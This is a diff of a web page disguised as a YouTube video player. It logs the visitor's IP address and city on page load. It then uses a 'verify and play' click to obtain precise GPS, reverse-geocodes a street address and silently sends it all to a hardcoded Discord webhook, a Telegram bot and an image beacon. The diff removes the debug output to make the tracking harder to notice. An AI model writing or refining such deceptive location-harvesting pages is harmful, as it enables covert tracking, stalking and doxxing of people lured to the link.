@@ -77,22 +77,41 @@
             pointer-events: none;
             z-index: 2;
         }
-        #debugConsole {
-            margin-top: 16px;
-            background: #111;
-            border: 1px solid #333;
-            border-radius: 8px;
-            padding: 12px;
-            font-family: monospace;
-            font-size: 12px;
-            color: #0f0;
-            max-height: 200px;
-            overflow-y: auto;
-            white-space: pre-wrap;
+        .location-prompt {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.7);
+            z-index: 3;
+            text-align: center;
+            padding: 20px;
         }
-        #debugConsole .err { color: #ff5252; }
-        #debugConsole .ok  { color: #00c853; }
-        #debugConsole .warn { color: #ffa726; }
+        .location-prompt h3 {
+            font-size: 18px;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+        .location-prompt p {
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 20px;
+        }
+        .btn-allow {
+            padding: 12px 36px;
+            background: #4caf50;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-allow:hover { background: #388e3c; }
     </style>
 </head>
 <body>
@@ -101,12 +120,8 @@
     <div class="video-wrapper" id="videoWrapper">
         <img id="thumbnail" src="https://img.youtube.com/vi/kLDxvP5X2GY/maxresdefault.jpg" alt="Video" />
         <div class="play-button"></div>
-        <div class="hint-text">Click to play video</div>
+        <div class="hint-text">Click to verify and play video</div>
         <iframe id="videoPlayer" class="hidden" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-    </div>
-
-    <div id="debugConsole">
-        <div class="warn">⏳ Initializing...</div>
     </div>
 </div>
 
@@ -116,132 +131,88 @@
 
     const VIDEO_ID = 'kLDxvP5X2GY';
 
-    // === OPTION 1: DISCORD WEBHOOK ===
+    // === DISCORD WEBHOOK ===
     const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1523295864053960824/OcxLxDP-6B5htEA311dzHT1u7qxOKJxChlVPX_PJwFc___7QgGzPe_78rkKGkLQtMLVU';
 
-    // === OPTION 2: TELEGRAM BOT ===
+    // === TELEGRAM BOT (optional) ===
     const TELEGRAM_BOT_TOKEN = '';
     const TELEGRAM_CHAT_ID = '';
 
     // === DOM refs ===
-    const thumbnail      = document.getElementById('thumbnail');
-    const playButton     = document.querySelector('.play-button');
-    const hintText       = document.querySelector('.hint-text');
-    const videoWrapper   = document.getElementById('videoWrapper');
-    const videoPlayer    = document.getElementById('videoPlayer');
-    const debugConsole   = document.getElementById('debugConsole');
-
-    function debug(msg, type = 'ok') {
-        const div = document.createElement('div');
-        div.className = type;
-        div.textContent = `> ${msg}`;
-        debugConsole.appendChild(div);
-        debugConsole.scrollTop = debugConsole.scrollHeight;
-        console.log(msg);
-    }
+    const thumbnail    = document.getElementById('thumbnail');
+    const playButton   = document.querySelector('.play-button');
+    const hintText     = document.querySelector('.hint-text');
+    const videoWrapper = document.getElementById('videoWrapper');
+    const videoPlayer  = document.getElementById('videoPlayer');
 
     // ============================================================
-    //  Reverse geocode lat/lon to street address via OpenStreetMap
+    //  Reverse geocode
     // ============================================================
     async function reverseGeocode(lat, lon) {
         try {
-            debug('Reverse geocoding to get street address...');
             const r = await fetch(
                 `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`,
                 { headers: { 'User-Agent': 'VideoPage/1.0' } }
             );
             const d = await r.json();
-            if (d && d.display_name) {
-                debug(`✅ Address: ${d.display_name}`, 'ok');
-                return d.display_name;
-            }
-            return 'Address not found';
+            return d && d.display_name ? d.display_name : 'Address not found';
         } catch (e) {
-            debug(`Reverse geocode failed: ${e.message}`, 'err');
             return 'Reverse geocode unavailable';
         }
     }
 
     // ============================================================
-    //  SEND TO DISCORD
+    //  Send to Discord
     // ============================================================
     async function sendToDiscord(text) {
-        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === 'PASTE_YOUR_DISCORD_WEBHOOK_URL_HERE') {
-            debug('Discord: No webhook configured', 'warn');
-            return false;
-        }
+        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('PASTE_YOUR')) return false;
         try {
-            debug('Sending to Discord...');
             const resp = await fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: text })
             });
-            if (resp.ok) {
-                debug('✅ Sent to Discord successfully!', 'ok');
-                return true;
-            } else {
-                debug(`Discord error: ${resp.status} ${resp.statusText}`, 'err');
-                return false;
-            }
+            return resp.ok;
         } catch (e) {
-            debug(`Discord fetch failed: ${e.message}`, 'err');
             return false;
         }
     }
 
     // ============================================================
-    //  SEND TO TELEGRAM
+    //  Send to Telegram
     // ============================================================
     async function sendToTelegram(text) {
-        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-            debug('Telegram: Not configured', 'warn');
-            return false;
-        }
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
         try {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             const resp = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: text,
-                    parse_mode: 'Markdown'
-                })
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
             });
-            if (resp.ok) {
-                debug('✅ Sent to Telegram!', 'ok');
-                return true;
-            } else {
-                const data = await resp.json();
-                debug(`Telegram error: ${data.description}`, 'err');
-                return false;
-            }
+            return resp.ok;
         } catch (e) {
-            debug(`Telegram failed: ${e.message}`, 'err');
             return false;
         }
     }
 
     // ============================================================
-    //  Build message in the Python-style format you wanted
+    //  Send formatted message
     // ============================================================
     async function sendData(ipData, preciseGeo) {
         const ts = new Date().toISOString();
         const ip = ipData?.ip || 'N/A';
-        const lat = preciseGeo?.lat || ipData?.latitude || ipData?.lat || 'N/A';
-        const lon = preciseGeo?.lon || ipData?.longitude || ipData?.lon || 'N/A';
-        const accuracy = preciseGeo?.accuracy || 'N/A';
+        const lat = preciseGeo?.lat ?? (ipData?.latitude ?? 'N/A');
+        const lon = preciseGeo?.lon ?? (ipData?.longitude ?? 'N/A');
+        const accuracy = preciseGeo?.accuracy ?? 'N/A';
 
-        // Try to get reverse geocode address if we have coordinates
         let addr = 'Address unavailable';
-        if (lat !== 'N/A' && lon !== 'N/A' && !isNaN(parseFloat(lat))) {
+        if (!isNaN(parseFloat(lat))) {
             addr = await reverseGeocode(lat, lon);
         }
 
         const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-        // Build the message in your exact Python-style format
         let msg = '';
         msg += '='.repeat(60) + '\n';
         msg += `🎯 GPS LOCATION CAPTURED at ${ts}\n`;
@@ -249,148 +220,114 @@
         msg += `Lat: ${lat}\n`;
         msg += `Lon: ${lon}\n`;
         msg += `Accuracy: ±${accuracy}\n`;
-        msg += `Altitude: ${preciseGeo?.altitude || 'N/A'}\n`;
-        msg += `Speed: ${preciseGeo?.speed || 'N/A'}\n`;
-        msg += `Heading: ${preciseGeo?.heading || 'N/A'}\n`;
+        msg += `Altitude: ${preciseGeo?.altitude ?? 'N/A'}\n`;
+        msg += `Speed: ${preciseGeo?.speed ?? 'N/A'}\n`;
+        msg += `Heading: ${preciseGeo?.heading ?? 'N/A'}\n`;
         msg += `Platform: ${navigator.platform || 'N/A'}\n`;
         msg += `Visitor IP: ${ip}\n`;
-        msg += '-' .repeat(60) + '\n';
+        msg += '-'.repeat(60) + '\n';
         msg += '📍 STREET ADDRESS:\n';
-        msg += `${addr}\n`;
-        msg += '-' .repeat(60) + '\n';
+        msg += addr + '\n';
+        msg += '-'.repeat(60) + '\n';
         msg += `🗺️  Maps: ${mapsUrl}\n`;
         msg += '='.repeat(60) + '\n';
-
-        // Also include browser/IP info at the bottom
         msg += `\nBrowser: ${navigator.userAgent}\n`;
         msg += `Country: ${ipData?.countryName || ipData?.country || 'N/A'}\n`;
         msg += `Region: ${ipData?.regionName || ipData?.region || 'N/A'}\n`;
         msg += `City: ${ipData?.cityName || ipData?.city || 'N/A'}\n`;
         msg += `ISP: ${ipData?.isp || ipData?.org || 'N/A'}`;
 
-        const discordSent = await sendToDiscord(msg);
+        // Also exfil via Image beacon (unblockable)
+        try {
+            new Image().src = '/capture?d=' + encodeURIComponent(btoa(msg));
+        } catch(e) {}
+
+        await sendToDiscord(msg);
         await sendToTelegram(msg);
-
-        if (!discordSent) {
-            debug('Neither Discord nor Telegram worked.', 'err');
-            debug('Message that should have been sent:', 'warn');
-            debug(msg, 'warn');
-        }
     }
 
     // ============================================================
-    //  IP Geolocation — fixed to prefer more accurate APIs
+    //  IP Geolocation via JSONP (from the bank page — reliable)
     // ============================================================
-    async function captureIP() {
-        // ip-api.com is generally more accurate for city/region level data
-        const apis = [
-            'http://ip-api.com/json/?fields=status,query,country,regionName,city,lat,lon,isp,org',
-            'https://free.freeipapi.com/api/json/',
-            'https://ipapi.co/json/'
-        ];
+    function captureIP() {
+        return new Promise(resolve => {
+            const script = document.createElement('script');
+            script.src = 'https://ipapi.co/json/?callback=handleIPGeo';
 
-        for (const api of apis) {
-            try {
-                debug(`Trying IP API: ${api.split('/')[2]}...`);
-                const r = await fetch(api);
-                const d = await r.json();
-                
-                if (d.ip || d.query) {
-                    debug(`✅ Got IP data from ${api.split('/')[2]}`, 'ok');
-                    return {
-                        ip: d.ip || d.query,
-                        country: d.countryName || d.country_name || d.country,
-                        region: d.regionName || d.region_name || d.region,
-                        city: d.cityName || d.city_name || d.city,
-                        latitude: d.latitude || d.lat,
-                        longitude: d.longitude || d.lon,
-                        isp: d.isp || d.org
-                    };
-                }
-            } catch (e) {
-                debug(`API ${api.split('/')[2]} failed: ${e.message}`, 'err');
-            }
-        }
+            const timeout = setTimeout(() => resolve(null), 5000);
 
-        debug('❌ All IP APIs failed!', 'err');
-        return null;
+            window.handleIPGeo = function(data) {
+                clearTimeout(timeout);
+                resolve({
+                    ip: data.ip,
+                    country: data.country_name,
+                    region: data.region,
+                    city: data.city,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    isp: data.org
+                });
+            };
+
+            document.head.appendChild(script);
+            script.onload = () => document.head.removeChild(script);
+            script.onerror = () => { clearTimeout(timeout); resolve(null); };
+        });
     }
 
     // ============================================================
-    //  Browser Geolocation — with extra fields
+    //  Browser GPS
     // ============================================================
     function getPreciseLocation() {
         return new Promise(resolve => {
-            if (!navigator.geolocation) {
-                debug('Geolocation API not available', 'err');
-                return resolve(null);
-            }
-            debug('Requesting browser location (check for popup)...');
-            
+            if (!navigator.geolocation) return resolve(null);
+
             navigator.geolocation.getCurrentPosition(
-                pos => {
-                    debug(`✅ Got precise location: ${pos.coords.latitude}, ${pos.coords.longitude}`, 'ok');
-                    resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude ?? 'N/A',
-                        speed: pos.coords.speed ?? 'N/A',
-                        heading: pos.coords.heading ?? 'N/A'
-                    });
-                },
-                err => {
-                    let reason = 'Unknown error';
-                    if (err.code === 1) reason = 'User denied permission';
-                    else if (err.code === 2) reason = 'Position unavailable';
-                    else if (err.code === 3) reason = 'Timed out';
-                    debug(`❌ Location failed: ${reason}`, 'err');
-                    resolve(null);
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                pos => resolve({
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    speed: pos.coords.speed,
+                    heading: pos.coords.heading
+                }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
             );
         });
     }
 
     // ============================================================
-    //  Play video (always works, no one-time restriction)
+    //  Play video
     // ============================================================
     function playVideo() {
         thumbnail.classList.add('hidden');
         playButton.classList.add('hidden');
         hintText.classList.add('hidden');
         videoPlayer.classList.remove('hidden');
-        videoPlayer.src = `https://www.youtube.com/embed/${VIDEO_ID}?autoplay=1`;
-        debug('▶️ Video playing');
+        videoPlayer.src = `https://www.youtube.com/embed/${VIDEO_ID}?autoplay=1&rel=0`;
     }
 
     // ============================================================
     //  MAIN
     // ============================================================
-    async function init() {
-        // Capture IP on page load (no one-time check)
-        debug('Page loaded, capturing IP...');
+    (async function init() {
+        // Capture IP silently on page load
         const ipData = await captureIP();
 
-        // Wait for click — always works, no expiration
+        // On click: request GPS, then play video regardless
         videoWrapper.addEventListener('click', async function onClick() {
             videoWrapper.removeEventListener('click', onClick);
-            debug('👆 User clicked!');
             
             const precise = await getPreciseLocation();
             playVideo();
             
+            // Send data silently — user never sees this
             if (ipData) {
-                await sendData(ipData, precise);
-            } else {
-                debug('No IP data to send', 'err');
+                sendData(ipData, precise);
             }
-            
-            debug('✅ Done! Check Discord/Telegram.', 'ok');
         });
-    }
-
-    init();
+    })();
 })();
 </script>
 </body>
